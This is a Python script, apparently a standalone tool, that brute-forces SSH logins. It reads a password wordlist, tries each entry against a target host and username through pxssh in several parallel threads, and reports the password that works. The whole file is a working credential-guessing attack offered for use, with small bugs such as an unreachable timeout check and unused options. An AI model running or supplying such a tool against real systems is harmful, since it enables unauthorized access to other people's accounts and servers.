"""
Script to bruteforce the ssh credentials

"""

import argparse
from pexpect import pxssh
import time
import threading

maxConnection = 5
connection_lock = threading.BoundedSemaphore(value=maxConnection)
Found = False
Fails = 0


def connect(host,user,password,port,release=True):  #handling the ssh 
    global Found
    global Fails

    try:    
        s=pxssh.pxssh()
        s.login(host,user,password,port=port)
        print("[+] Password found " + password)
        Found = True
    except Exception as e:
        if("read_nonblocking" in str(e)):
            Fails+=1
            print(Fails)
            time.sleep(5)
            connect(host,user,password,port,False)
        elif("synchronize with orignal prompt" in str(e)):
            Fails+=1
            print(Fails)
            time.sleep(1)
            connect(host,user,password,port,False)
    finally:
        if(release):
            connection_lock.release()
        
def main():
    paser=argparse.ArgumentParser(description="A SSH interaction script")

    paser.add_argument("-H",required=True,dest="host",help="Enter the target host to connect")
    paser.add_argument("-U",required=True,dest="user",help="Enter the username")
    paser.add_argument("-p",required=False,dest="password",help="Enter the password")
    paser.add_argument("-C",dest="cmd",help="Enter any command to want to add")
    paser.add_argument("-P",required=False,dest="port",help="Enter the port if required")
    paser.add_argument("-f",required=False,dest="passwdFile",help="specify password file")

    args = paser.parse_args()
    
    host=args.host
    user=args.user
    password=args.password
    port=args.port
    passwdFile=args.passwdFile

    with open(passwdFile) as file: #reading the passwd file
        for line in file.readlines():
            if Found:
                print("[*] Exiting: Password Found")
                exit(0)
                if Fails > 5:
                    print("[!] Exiting: Too Many Socket Timeouts")
                    exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = threading.Thread(target=connect,args=(host, user, password,port,True))
            t.start()

if __name__=="__main__":
    main()